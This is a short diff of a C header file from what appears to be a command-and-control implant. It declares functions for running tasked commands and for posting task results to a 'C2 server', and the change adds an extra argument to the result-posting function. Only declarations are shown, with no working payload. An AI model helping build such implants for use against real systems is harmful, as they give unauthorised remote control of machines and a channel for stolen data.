@@ -63,7 +63,7 @@ bool exec_cmd(struct tasks *task);
 bool can_run_cmd(const char *cmd);
 
 // Posts task results to C2 server.
-bool post_results(struct tasks *task);
+bool post_results(struct tasks *task, struct strings_array *sa);
 
 // Frees memory for task array of strings.
 void destroy(struct tasks *task);
